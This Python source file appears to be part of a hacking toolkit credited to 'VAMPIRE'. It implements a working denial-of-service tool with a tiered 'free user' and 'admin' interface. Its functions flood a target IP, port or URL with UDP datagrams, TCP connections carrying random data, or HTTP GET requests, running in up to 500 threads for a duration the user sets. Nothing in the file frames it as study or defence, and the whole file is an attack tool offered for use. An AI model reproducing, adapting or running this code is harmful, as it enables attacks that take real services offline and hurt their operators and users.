import os
import sys
import time
import socket
import threading
import random
import signal

# Ensure dependencies before import
from core.error_fix import ensure_package
ensure_package("requests")
import requests

from core.utils import color, slowprint

stop_attack = False

# ===== SIGNAL HANDLER ===== #
def stop_handler(signum, frame):
    global stop_attack
    stop_attack = True
    print(color("red", "\n[!] Attack interrupted by user! Exiting..."))
    sys.exit(0)

signal.signal(signal.SIGINT, stop_handler)

# ===== BANNERS ===== #
def show_banner(mode="user"):
    os.system("clear")
    if mode == "admin":
        print(color("bold_red", r"""
 __     ___  _ __   ___ | |_ ___  _ __ ___   ___ 
 \ \ /\ / / | '_ \ / _ \| __/ _ \| '_ ` _ \ / _ \
  \ V  V /__| | | | (_) | || (_) | | | | | |  __/
   \_/\_/(_)_| |_|\___/ \__\___/|_| |_| |_|\___| 
              [ Vampire-Admin-Access ]
        """))
    else:
        print(color("bold_cyan", r"""
 __     ___       _       _     _             
 \ \   / (_)     (_)     | |   (_)            
  \ \_/ / _ _ __  _  __ _| |__  _ _ __   __ _ 
   \   / | | '_ \| |/ _` | '_ \| | '_ \ / _` |
    | |  | | | | | | (_| | | | | | | | | (_| |
    \_/  |_|_| |_|_|\__, |_| |_|_|_| |_|\__, |
                     __/ |              __/ |
                    |___/              |___/ 
              [ Free-User-Access ]
        """))
    print(color("yellow", "\n>> Coded by: Muhammad Shourov (VAMPIRE)\n"))

# ===== ADMIN ATTACKS ===== #
def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout and not stop_attack:
        msg = os.urandom(random.randint(1024, 65500))
        try:
            sock.sendto(msg, (ip, port))
            print(color("magenta", f"[UDP] => {ip}:{port}"), end="\r")
        except Exception as e:
            continue

def tcp_flood(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(os.urandom(random.randint(512, 10240)))
            sock.close()
            print(color("red", f"[TCP] => {ip}:{port}"), end="\r")
        except:
            continue

def http_flood(target_url, duration):
    timeout = time.time() + duration
    session = requests.Session()
    while time.time() < timeout and not stop_attack:
        headers = {
            "User-Agent": f"DDoS-Agent/{random.randint(1000,9999)}"
        }
        try:
            session.get(target_url, headers=headers, timeout=2)
            print(color("yellow", f"[HTTP-GET] => {target_url}"), end="\r")
        except:
            continue

# ===== USER ATTACKS ===== #
def user_udp(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"#" * 1024
    while time.time() < timeout and not stop_attack:
        try:
            sock.sendto(payload, (ip, port))
            print(color("cyan", f"[USER_UDP] => {ip}:{port}"), end="\r")
        except:
            continue

def user_tcp(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(b"#" * 1024)
            sock.close()
            print(color("cyan", f"[USER_TCP] => {ip}:{port}"), end="\r")
        except:
            continue

# ===== ENTRY FUNCTION ===== #
def start_ddos(mode="user"):
    try:
        show_banner(mode)
        if mode == "admin":
            attack_type = input(color("red", "[1] UDP\n[2] TCP\n[3] HTTP\n\nChoose attack type: "))
            if attack_type == "3":
                url = input(color("cyan", "Target URL (http/https): "))
            else:
                ip = input(color("cyan", "Target IP: "))
                port = int(input(color("cyan", "Target Port: ")))

            duration = int(input(color("cyan", "Duration (seconds): ")))
            threads = int(input(color("cyan", "Thread count (e.g., 200): ")))

            if threads > 500:
                print(color("red", "[!] Too many threads! Max allowed is 500. Setting to 500."))
                threads = 500

            print(color("green", "\n[✓] Launching Advanced Attack...\n"))
            time.sleep(1)

            for _ in range(threads):
                if attack_type == "1":
                    threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
                elif attack_type == "2":
                    threading.Thread(target=tcp_flood, args=(ip, port, duration)).start()
                elif attack_type == "3":
                    threading.Thread(target=http_flood, args=(url, duration)).start()

        else:
            ip = input(color("cyan", "Target IP: "))
            port = int(input(color("cyan", "Target Port: ")))
            duration = int(input(color("cyan", "Duration (seconds, max 60): ")))

            if duration > 60:
                print(color("red", "[!] Free user limit: Max 60 seconds. Setting to 60."))
                duration = 60

            print(color("green", "\n[✓] Launching Basic User Attack...\n"))
            for _ in range(30):
                threading.Thread(target=user_udp, args=(ip, port, duration)).start()
                threading.Thread(target=user_tcp, args=(ip, port, duration)).start()

    except Exception as err:
        print(color("red", f"\n[!] Error Detected: {err}"))
